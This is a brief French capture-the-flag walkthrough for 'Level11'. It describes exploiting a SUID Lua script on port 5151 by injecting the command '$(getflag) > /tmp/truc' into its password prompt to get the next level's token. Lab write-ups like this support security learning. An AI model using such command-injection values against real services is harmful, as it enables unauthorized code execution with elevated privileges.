# Level11

[ENGLISH version](README_EN.md)

## Comment obtenir le flag

Le fichier présent est un fichier Lua.

Le fichier possède un bit SUID, nous pourrions donc l'exploiter.

Il y a un hachage sha1 à l'intérieur, mais c'est un faux chemin ; le décryptage de son contenu ne fait que le dire : NotSoEasy (https://www.dcode.fr/sha1-hash)

Nous pouvons créer une injection de code

Tout d'abord, nous devons nous connecter :

```
nc 127.0.0.1 5151
```

et lorsque le mot de passe est demandé, taper : 

```
$(getflag) > /tmp/truc
```

alors,

```
cat /tmp/truc
```

Le fichier contient un jeton pour se connecter au level12

## Le drapeau

Nous pouvons utiliser ce jeton pour nous connecter à level12
